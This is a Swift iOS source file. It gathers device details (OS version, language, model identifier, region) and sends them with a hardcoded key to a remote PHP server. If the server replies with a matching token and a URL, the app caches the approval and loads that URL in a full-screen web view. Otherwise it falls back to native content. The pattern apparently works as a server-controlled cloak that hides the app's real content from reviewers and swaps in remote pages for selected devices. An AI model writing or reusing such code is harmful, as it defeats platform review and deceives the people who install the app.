import SwiftUI
import WebKit
import UIKit
import PhotosUI
import Combine

enum SecureStorageError: Error {
    case notFound
    case unexpectedStatus(OSStatus)
}

func saveSecureValue(key: String, value: String) throws {
    let data = Data(value.utf8)
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key
    ]
    let attributes: [String: Any] = [kSecValueData as String: data]
    
    let status = SecItemCopyMatching(query as CFDictionary, nil)
    if status == errSecSuccess {
        print("🔑 Updating secure value for key: \(key)")
        let update = SecItemUpdate(query as CFDictionary, attributes as CFDictionary)
        guard update == errSecSuccess else { throw SecureStorageError.unexpectedStatus(update) }
    } else if status == errSecItemNotFound {
        print("🔑 Saving new secure value for key: \(key)")
        var newItem = query
        newItem[kSecValueData as String] = data
        let add = SecItemAdd(newItem as CFDictionary, nil)
        guard add == errSecSuccess else { throw SecureStorageError.unexpectedStatus(add) }
    } else {
        print("❌ Secure save error with status: \(status)")
        throw SecureStorageError.unexpectedStatus(status)
    }
}

func loadSecureValue(key: String) throws -> String {
    print("🔎 Trying to load secure value for key: \(key)")
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key,
        kSecReturnData as String: true,
        kSecMatchLimit as String: kSecMatchLimitOne
    ]
    var result: AnyObject?
    let status = SecItemCopyMatching(query as CFDictionary, &result)
    
    if status == errSecSuccess {
        guard let data = result as? Data,
              let value = String(data: data, encoding: .utf8) else {
            throw SecureStorageError.unexpectedStatus(status)
        }
        print("✅ Loaded secure value for key: \(key)")
        return value
    } else if status == errSecItemNotFound {
        print("⚠️ Secure value not found for key: \(key)")
        throw SecureStorageError.notFound
    } else {
        print("❌ Secure load error with status: \(status)")
        throw SecureStorageError.unexpectedStatus(status)
    }
}

func deviceSystemInfo() -> String {
    let info = "\(UIDevice.current.systemName) \(UIDevice.current.systemVersion)"
    print("📱 Device system info: \(info)")
    return info
}

func deviceLanguageCode() -> String {
    let lang = Locale.preferredLanguages.first ?? "en"
    let code = lang.components(separatedBy: "-").first?.lowercased() ?? "en"
    print("🌐 Device language code: \(code)")
    return code
}

func deviceModelIdentifier() -> String {
    var sys = utsname()
    uname(&sys)
    let model = Mirror(reflecting: sys.machine).children.reduce(into: "") { result, element in
        if let value = element.value as? Int8, value != 0 {
            result.append(Character(UnicodeScalar(UInt8(value))))
        }
    }
    print("🖥 Device model identifier: \(model)")
    return model
}

func deviceRegionCode() -> String? {
    let region = Locale.current.regionCode
    print("🌍 Device region code: \(region ?? "nil")")
    return region
}

struct RemoteSettings {
    static let verificationKey   = "GJDFHDFHFDJGSDAGKGHK"
    static let serverURL         = "https://wallen-eatery.space/ios-ha-16/server.php"
    static let accessKey         = "Bs2675kDjkb5Ga"
    static let cacheURLKey       = "cachedTrustedURL"
    static let cacheTokenKey     = "cachedVerificationToken"
}

@MainActor
final class AccessManager: ObservableObject {
    @Published var status = Status.idle
    
    enum Status {
        case idle, validating
        case approved(token: String, url: URL)
        case useNative
    }
    
    func startValidation() {
        print("🚀 Starting validation...")
        if let cachedURLString = UserDefaults.standard.string(forKey: RemoteSettings.cacheURLKey),
           let cachedURL = URL(string: cachedURLString),
           let savedToken = try? loadSecureValue(key: RemoteSettings.cacheTokenKey),
           savedToken == RemoteSettings.verificationKey {
            
            print("✅ Using cached approval with URL: \(cachedURL)")
            status = .approved(token: savedToken, url: cachedURL)
            return
        }
        
        print("🔄 No cache found, performing server validation...")
        Task { await performServerValidation() }
    }
    
    private func performServerValidation() async {
        status = .validating
        print("⏳ Performing server validation...")
        
        guard let requestURL = buildRequestURL() else {
            print("❌ Failed to build request URL. Falling back to native.")
            status = .useNative
            return
        }
        
        print("🌐 Request URL: \(requestURL)")
        let maxRetries = 3
        for attempt in 1...maxRetries {
            do {
                let response = try await fetchServerText(from: requestURL)
                print("📩 Server response: \(response)")
                
                let segments = response.trimmingCharacters(in: .whitespacesAndNewlines).components(separatedBy: "#")
                
                if segments.count == 2,
                   segments[0] == RemoteSettings.verificationKey,
                   let validURL = URL(string: segments[1]) {
                    
                    print("✅ Server validation success. Approved URL: \(validURL)")
                    UserDefaults.standard.set(validURL.absoluteString, forKey: RemoteSettings.cacheURLKey)
                    try? saveSecureValue(key: RemoteSettings.cacheTokenKey, value: segments[0])
                    
                    status = .approved(token: segments[0], url: validURL)
                    return
                } else {
                    print("❌ Invalid server response. Falling back to native.")
                    status = .useNative
                    return
                }
            } catch {
                print("⚠️ Attempt \(attempt) failed with error: \(error.localizedDescription)")
                if attempt < maxRetries {
                    let delay = min(pow(2.0, Double(attempt)), 30.0)
                    print("🔁 Retrying after \(delay) seconds...")
                    try? await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000))
                } else {
                    print("❌ All attempts failed. Falling back to native.")
                    status = .useNative
                    return
                }
            }
        }
    }
    
    private func fetchServerText(from url: URL) async throws -> String {
        print("🌐 Fetching from server: \(url)")
        let (data, _) = try await URLSession.shared.data(from: url)
        return String(decoding: data, as: UTF8.self)
    }
    
    private func buildRequestURL() -> URL? {
        var components = URLComponents(string: RemoteSettings.serverURL)
        components?.queryItems = [
            URLQueryItem(name: "p", value: RemoteSettings.accessKey),
            URLQueryItem(name: "os", value: deviceSystemInfo()),
            URLQueryItem(name: "lng", value: deviceLanguageCode()),
            URLQueryItem(name: "devicemodel", value: deviceModelIdentifier())
        ]
        if let country = deviceRegionCode() {
            components?.queryItems?.append(URLQueryItem(name: "country", value: country))
        }
        return components?.url
    }
}

@available(iOS 14.0, *)
final class WebHostController: UIViewController, WKUIDelegate, WKNavigationDelegate, UIDocumentPickerDelegate, PHPickerViewControllerDelegate {
    
    var onLoadingStateChange: ((Bool) -> Void)?
    private var webView: WKWebView!
    private var initialURL: URL
    fileprivate var fileCompletion: (([URL]?) -> Void)?
    
    init(url: URL) {
        self.initialURL = url
        super.init(nibName: nil, bundle: nil)
        configureWebView()
        print("🌐 WebHostController initialized with URL: \(url)")
    }
    
    required init?(coder: NSCoder) { fatalError() }
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        print("📲 WebView loading...")
        view.addSubview(webView)
        webView.translatesAutoresizingMaskIntoConstraints = false
        
        if #available(iOS 11.0, *) {
            webView.insetsLayoutMarginsFromSafeArea = false
            webView.scrollView.contentInsetAdjustmentBehavior = .never
        }
        
        NSLayoutConstraint.activate([
            webView.topAnchor.constraint(equalTo: view.topAnchor),
            webView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            webView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            webView.trailingAnchor.constraint(equalTo: view.trailingAnchor)
        ])
        
        onLoadingStateChange?(true)
        webView.load(URLRequest(url: initialURL))
    }
    
    private func configureWebView() {
        print("⚙️ Configuring WKWebView")
        let config = WKWebViewConfiguration()
        config.preferences.javaScriptEnabled = true
        config.websiteDataStore = .default()
        
        webView = WKWebView(frame: .zero, configuration: config)
        webView.uiDelegate = self
        webView.navigationDelegate = self
        webView.scrollView.bounces = false
        webView.scrollView.minimumZoomScale = 1.0
        webView.scrollView.maximumZoomScale = 1.0
    }
    
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        print("✅ WebView finished loading")
        onLoadingStateChange?(false)
    }
    
    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        print("❌ WebView failed: \(error.localizedDescription)")
        onLoadingStateChange?(false)
    }
}

@available(iOS 14.0, *)
extension WebHostController: UIDocumentPickerDelegate, PHPickerViewControllerDelegate {
    
    func documentPicker(_ controller: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
        print("📂 Document picked: \(urls)")
        fileCompletion?(urls)
    }
    
    func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) {
        print("⚠️ Document picker cancelled")
        fileCompletion?(nil)
    }
    
    func picker(_ picker: PHPickerViewController, didFinishPicking results: [PHPickerResult]) {
        print("🖼 Picker finished, results count: \(results.count)")
        picker.dismiss(animated: true)
        
        var pickedURLs: [URL] = []
        let group = DispatchGroup()
        
        for provider in results.map({ $0.itemProvider }) {
            if provider.hasItemConformingToTypeIdentifier(UTType.image.identifier) {
                group.enter()
                provider.loadFileRepresentation(forTypeIdentifier: UTType.image.identifier) { url, _ in
                    if let url = url {
                        print("🖼 Picked image URL: \(url)")
                        pickedURLs.append(url)
                    }
                    group.leave()
                }
            }
        }
        
        group.notify(queue: .main) {
            print("📦 Picker finished with URLs: \(pickedURLs)")
            self.fileCompletion?(pickedURLs.isEmpty ? nil : pickedURLs)
        }
    }
    
    func presentFilePickerFallback(completion: @escaping ([URL]?) -> Void) {
        print("📂 Presenting fallback file picker")
        self.fileCompletion = completion
        
        let alert = UIAlertController(title: "Choose File", message: nil, preferredStyle: .actionSheet)
        
        alert.addAction(UIAlertAction(title: "Photo/Video", style: .default) { _ in
            print("📸 Photo/Video option selected")
            var config = PHPickerConfiguration(photoLibrary: .shared())
            config.selectionLimit = 1
            config.filter = .any(of: [.images, .videos])
            
            let picker = PHPickerViewController(configuration: config)
            picker.delegate = self
            self.present(picker, animated: true)
        })
        
        alert.addAction(UIAlertAction(title: "Files", style: .default) { _ in
            print("📄 Files option selected")
            let picker = UIDocumentPickerViewController(forOpeningContentTypes: [.item], asCopy: true)
            picker.delegate = self
            picker.allowsMultipleSelection = false
            self.present(picker, animated: true)
        })
        
        alert.addAction(UIAlertAction(title: "Cancel", style: .cancel) { _ in
            print("❌ File picker cancelled by user")
            completion(nil)
        })
        
        self.present(alert, animated: true)
    }
}

@available(iOS 14.0, *)
struct WebViewRepresentable: UIViewControllerRepresentable {
    let url: URL
    @Binding var loading: Bool
    
    func makeUIViewController(context: Context) -> WebHostController {
        print("🛠 Creating WebViewRepresentable")
        let vc = WebHostController(url: url)
        vc.onLoadingStateChange = { active in
            print("🔄 WebView loading state: \(active)")
            DispatchQueue.main.async { loading = active }
        }
        return vc
    }
    
    func updateUIViewController(_ vc: WebHostController, context: Context) {
        print("🔄 Updating WebViewRepresentable")
    }
}
